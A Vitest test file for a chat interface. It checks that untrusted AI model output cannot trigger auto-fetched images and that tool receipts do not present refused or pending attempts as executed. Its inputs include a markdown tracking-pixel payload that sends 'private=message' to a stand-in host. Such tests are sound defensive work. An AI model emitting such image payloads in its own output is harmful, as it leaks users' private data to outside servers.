import { describe, expect, it } from "vitest";
import { renderToStaticMarkup } from "react-dom/server";
import { Markdown } from "./Markdown";
import { Receipt } from "../routes/BotRoom";

describe("untrusted model rendering", () => {
  it.each([
    "![tracking](https://example.test/pixel?private=message)",
    "![same-origin](/v1/action)",
    '![reference][tracking]\n\n[tracking]: //example.test/pixel',
    '<img src="https://example.test/pixel">',
  ])("never renders an automatically fetched image: %s", (text) => {
    const html = renderToStaticMarkup(<Markdown>{text}</Markdown>);
    expect(html).not.toMatch(/<img\b|<link\b|<iframe\b|<video\b/);
  });

  it("renders images as explicit user-followed links", () => {
    const html = renderToStaticMarkup(<Markdown>{"![chart](https://example.test/chart.png)"}</Markdown>);
    expect(html).toContain("chart (open image)");
    expect(html).toContain('rel="noopener noreferrer nofollow"');
  });

  it("does not call a refused/pending attempt an executed tool", () => {
    const html = renderToStaticMarkup(<Receipt tools={[]} attempts={["write_file"]} />);
    expect(html).toContain("no confirmed tool execution");
    expect(html).toContain("may be refused, pending or failed");
    expect(html).not.toContain("returned a result");
  });

  it("does not turn historical inbox names into execution evidence", () => {
    const html = renderToStaticMarkup(<Receipt attempts={["shell_command"]} />);
    expect(html).not.toContain("returned a result");
    expect(html).toContain("attempted");
  });
});
